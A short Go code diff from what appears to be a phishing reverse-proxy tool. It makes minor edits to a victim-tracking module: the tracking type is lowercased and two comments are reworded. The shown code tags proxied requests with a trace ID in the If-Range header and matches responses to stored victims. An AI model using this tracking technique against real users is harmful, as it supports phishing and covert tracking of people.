@@ -85,7 +85,7 @@ func Load(s *session.Session) (m *Tracker, err error) {
 	m = &Tracker{
 		SessionModule: session.NewSessionModule(Name, s),
 		Enabled:       s.Config.Tracking.Enabled,
-		Type:          s.Config.Tracking.Type,
+		Type:          strings.ToLower(s.Config.Tracking.Type),
 	}
 
 	if !m.Enabled {
@@ -262,7 +262,7 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 
 	//
 	// Set trackers:
-	// - HTTP Header If-Range
+	// - HTTP Headers If-Range
 	request.Header.Set("If-Range", t.ID)
 
 	// Check if the Trace ID is bind to an existing victim
@@ -319,7 +319,7 @@ func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim
 	}
 
 	if !trackingFound {
-		// Trace not found in Cookies check If-Range HTTP Header
+		// Trace not found in Cookies check If-Range HTTP Headers
 		t = module.makeTrace(response.Request.Header.Get("If-Range"))
 		if t.IsValid() {
 
